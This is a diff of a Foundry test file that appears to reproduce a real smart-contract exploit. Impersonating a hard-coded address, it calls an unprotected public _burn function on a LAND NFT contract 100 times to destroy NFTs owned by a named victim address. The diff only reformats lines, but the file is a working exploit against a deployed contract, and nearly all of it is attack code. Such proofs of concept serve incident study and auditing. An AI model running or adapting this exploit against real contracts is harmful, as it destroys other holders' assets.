@@ -5,10 +5,14 @@ pragma solidity >=0.7.0 <0.9.0;
 import "forge-std/Test.sol";
 
 interface ILand {
+
     function _burn(address from, address owner, uint256 id) external;
     function _numNFTPerAddress(address) external view returns (uint256);
+
 }
+
 contract ContractTest is Test {
+
     ILand Land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);
     address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;
 
@@ -18,17 +22,12 @@ contract ContractTest is Test {
 
     function testExploit() public {
         vm.startPrank(0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C);
-        console.log(
-            "Before exploiting, victim owned NFT:",
-            Land._numNFTPerAddress(victim)
-        ); // 2762 is the number of NFTs in the victim's account.
+        console.log("Before exploiting, victim owned NFT:", Land._numNFTPerAddress(victim)); // 2762 is the number of NFTs in the victim's account.
         for (uint256 i = 0; i < 100; i++) {
             // let's try to burn 100 nfts
             Land._burn(victim, victim, 3738); // _burn function that was set to be called was set in a public state, anyone can burn any user's NFT.
         }
-        console.log(
-            "After exploiting, victim owned NFT:",
-            Land._numNFTPerAddress(victim)
-        );
+        console.log("After exploiting, victim owned NFT:", Land._numNFTPerAddress(victim));
     }
+
 }
